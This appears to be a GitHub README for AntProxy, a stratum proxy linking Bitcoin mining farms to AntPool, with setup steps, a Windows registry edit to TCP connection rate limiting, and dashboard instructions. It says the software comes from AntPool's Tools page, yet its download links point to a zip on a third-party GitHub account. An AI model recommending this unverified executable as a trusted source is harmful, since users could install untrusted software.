# AntProxy is a stratum proxy of AntPool

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/4e865b3c-e61b-4757-8d0a-d5d91563d13d)

AntProxy – This software is designed for a large number of ASICs. This software solves the problem of low communication efficiency between the mining farm and AntPool, saves bandwidth and stabilizes the connection.

- [Dowload link AntProxy v2.1.1.zip](https://github.com/BTC-media/antproxy_tool/releases/download/antproxy_use/antproxy_v2.1.1.zip)
------------------------------------
- [Setup instructoins AntProxy.pdf](https://github.com/BTC-media/antproxy_tool/blob/master/antproxy-en.pdf)
---------------------------------------
Note:
-------
+ It is recommended to use windows 10 64bit to run this software.
+ To use this software, please first download it from the Tools web page in AntPool.
+ This software is currently only applicable for BTC/BCH mining.

## AntProxy configuration requirements:
+ for less than 10,000 miners the recommended configurations are as follows: CPU i5 or higher, more than 8G memory space, windows 10 system
+ Linux version is recommended for more than 10,000 miners

## AntProxy instructions

### Preparation: changing the system registry.
1. Press WIN+R to open “Run” and type “regedit” to enter the registry

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/68848384-1327-4a23-ba98-f6285c6a0b36)

2. Go to HKEY_LOCAL_MACHINESYSTEM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters. Find the EnableConnectionRateLimiting key in the right pane and change its value to blank.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/2e41f839-0247-4973-a0c4-838676803d65)

If the EnableConnectionRateLimiting key cannot be found, right-click on an empty location to create a new “string value”, name it “EnableConnectionRateLimiting” and leave the value blank;

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/d92ba639-128a-4e00-b2db-28bde18354ae)

Double-click the installation file to run AntProxy_Launcher.exe. Do not close the launch window that appears. Otherwise, the agent will be closed and you won’t be able to access the program’s web page

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/f0af765c-f39d-4adf-b8cc-4d38d47e9941)

### Log in to the software web page
The IP for logging into the software is the local network IP: 3000, for example: http://168.0.0.1:3000. 
Enter this IP in the address bar of your browser, and then you can log in without a user password. 
Method of requesting the local network IP: [Press WIN+R key combination to open “Run” and type ipconfig] to query;

### Software interface and how to add a new proxy
Interface after logging in:

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/bb396ad4-7304-4f6a-ac90-9e592400ebbd)

On the page, click the “+” button on the right side to add the proxy address.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/74d6f9ea-5536-45f7-bcb5-3965726f304f)

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/6aba73e7-aaa1-4bb4-88ca-414c781b368a)

Proxy address (port): For example, if the proxy address is 192.168.120.89:3333, then 3333 is the proxy port. You can arbitrarily select four digits from “1000-9999”. If the selected port is occupied by other devices, please try entering a different port number.

Pool: Enter the full address of the pool, for example, the AntPool mining address:
  + Pool 1: stratum.antpool.com: 3333
  + Pool 2: stratum.antpool.com: 443
  + Pool 3: stratum.antpool.com: 25
Subaccount name: must match the name of the subaccount registered with Antpool.
Password: Optional, composed of letters and numbers
Save: After saving the configuration, the proxy address will automatically appear in the proxy list. You need to start the data transfer manually.
Save and run: save the new proxy address and start the data transfer at the same time.

## Miner configuration
After configuring the proxy port, you can start configuring the miners. For example, if the proxy port is: 192.168.120.89:3335.

Then the backstage URL of the miner can be configured as shown in the screenshot below. Once configuration is complete, click “save and run”.

How to check the data on the AntProxy interface

## Interface

### 1. Switching languages (Chinese and English

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/fb43593a-7b4b-4cb7-85ed-8f75b96fd2ae)

### 2. Hash rate data:

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/2476f030-4c72-4435-814f-3bed1a629dbc)

Remote hashrate: The hashrate of all miners connected through the proxy Success rate: Success rate of transferring data from the proxy to the pool Hashrate: The real-time hash rate sent by the miners to the proxy Hourly: Average hash rate sent by the miners to the proxy in one hour Daily: Average hash rate sent by miners to the proxy server per day Miners: in green (number of online miners); in white (total number of miners)

### 3. Data in the graph

A: Worker name set for each proxy port (must match the work name registered in AntPool under the account). Different colors represent different proxy ports. You can check accordingly. 
B: Click the icon to zoom in on the curve. 
C: Click the icon to view the software guide.
![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/93171f46-7877-4050-b4ca-76fcdb17d20a)

### 4. Proxy Address 

A: Proxy Address: The proxy address to which the miners are connected 
B: Pool: The address of the pool to which the proxy is connected C: Subaccount Name: The name of the worker set for the proxy 
D: Hashrate: The real-time hashrate of all the miners connected to this proxy port. 
E: Miners: The number of all miners connected to this proxy port. 
F: Success Rate: Success rate of transferring data from the proxy to the pool 
G: Status: “Transmit” and “Disconnected”. 
J: Actions: “Edit”, “Delete”, “Enable” and “Disable”.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/00ce4051-35fb-430c-bf0c-c2ab14deec1b)

### 5. Features of a proxy address

By clicking on the corresponding proxy address, you can see all the miners connected to that address, with the status: All/Online/Not Online/Not Successful

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/f6e8897d-f468-46ec-90cf-4be37a36df12)

By clicking on the icon, you can see a graph.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/7409f71f-5ae5-4ce3-8b8e-2253782138d3)

Click “ANTProxy” in the upper left corner to return to the home page.

### 6. Settings

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/5e195a75-e594-4f73-8461-5c63ad5290a2)

Hover your mouse over the Proxy address you want to configure, options will appear: “Edit”, “Delete”, “Edit, Delete, Enable, and Disable.

Enabled: After configuring the proxy address, swipe the mouse over the proxy address, the enable button will be displayed (green icon), click the “Enable” button to start data transfer to the mining pool.
Disconnected: move the mouse over the operating status icon (circle status), it will be displayed as “Disconnect” button (red icon), click “Disconnect” button to stop proxy data transmission.
Sudden interruption of normal proxy data transmission will lead to loss of earnings.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/edc0f2d3-a216-4fcd-bee2-27e99d30860a)

Delete: A proxy address cannot be deleted if the proxy’s operating status is Transmit or Enable; first click Disable to stop transmission, then you can continue the delete operation.

![image](https://github.com/BTC-media/antproxy_tool/assets/71077949/124573fb-ee54-4c79-b725-fa96e4e4cd93)

- Dowload link AntProxy v2.1.1: https://github.com/BTC-media/antproxy_tool/releases/download/antproxy_use/antproxy_v2.1.1.zip
- Setup instructoins: https://github.com/BTC-media/antproxy_tool/blob/master/antproxy-en.pdf
